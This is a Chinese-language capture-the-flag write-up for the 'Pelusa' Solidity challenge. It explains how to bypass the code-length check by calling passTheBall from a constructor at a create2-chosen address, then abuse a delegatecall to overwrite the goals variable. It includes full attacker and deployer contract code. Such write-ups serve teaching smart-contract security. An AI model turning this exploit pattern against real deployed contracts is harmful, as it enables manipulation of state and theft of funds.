## Pelusa

### 目标

修改 `goals` 值为 2

### 分析

合约内并没有修改 `goals` 变量的方法。唯一可以利用的就是 `shoot` 方法内的 `player.delegatecall`, 然后在自己的合约内修改 `goals` 变量值

但是要调用 `shoot` 必须要成为 `player` 且 `player` 需要是一个合约地址。成为 `player` 是必须要调用 `passTheBall`

`passTheBall` 有两个条件

- `msg.sender.code.length == 0`
- `uint256(uint160(msg.sender)) % 100 == 10`

一方面要求合约账户的 `code.length` 为零, 另一方面要求合约地址除以 100 余 10

唯一可行的方式是用 `create2` 与计算出确定的合约地址, 但是不部署合约(在合约的构造函数内调用 `passTheBall`)。

### POC

```solidity
contract PelusaAttacker is IGame {
    address public owner;
    uint256 goals;

    constructor(address _owner, address pelusa) {
        owner = _owner;
        Pelusa(pelusa).passTheBall();
    }

    function getBallPossesion() external view override returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

contract PelusaAttackerDeployer {
    address public deployment;
    address immutable target;

    constructor(address _target) {
        target = _target;
    }

    function deployAttacker(address _owner, bytes32 _salt) external {
        address addr = address(new PelusaAttacker{salt: _salt}(_owner, target));
        require(uint256(uint160(addr)) % 100 == 10, "bad address");
        deployment = addr;
    }

    function getAttackerAddress(
        address _owner,
        bytes32 _salt,
        address _pelusa
    ) external view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(PelusaAttacker).creationCode,
            abi.encode(_owner, _pelusa)
        );
        bytes32 _hash = keccak256(
            abi.encodePacked(hex"ff", address(this), _salt, keccak256(bytecode))
        );
        return address(uint160(uint256(_hash)));
    }
}
```
